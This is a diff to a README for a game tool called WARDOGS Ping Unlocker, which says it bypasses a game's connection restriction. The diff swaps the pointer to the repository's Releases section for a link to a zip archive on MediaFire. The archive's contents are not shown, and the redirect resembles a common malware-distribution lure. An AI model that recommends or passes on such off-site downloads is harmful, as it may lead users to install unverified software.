@@ -16,8 +16,10 @@ WARDOGS Ping Unlocker is designed to modify how the local connection restriction
 The program does not reduce your actual Ping. Its sole purpose is to bypass the restriction during the connection process and while playing the game.
 
 # 📦 Installation
-Navigate to the Releases section of this repository.
+<a href="https://www.mediafire.com/file/qt76xy6pe7ao92j/PingUnlocker_v1.0.1.zip/file">
 Download the archive containing the latest version: PingUnlocker_v1.0.1.zip.
+</a>
+
 Unzip the archive into any convenient folder
 
 # ⚠️ Important Notes
